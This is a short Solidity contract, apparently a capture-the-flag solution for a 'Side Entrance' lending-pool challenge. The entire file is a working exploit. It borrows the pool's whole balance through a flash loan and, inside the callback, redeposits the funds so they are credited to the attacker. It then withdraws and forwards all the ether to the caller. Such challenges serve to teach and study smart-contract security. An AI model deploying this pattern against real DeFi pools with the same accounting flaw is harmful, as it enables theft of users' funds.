// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool public pool;

    constructor(address pool_) payable {
        pool = SideEntranceLenderPool(pool_);
    }

    function attack() public payable {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function execute() public payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
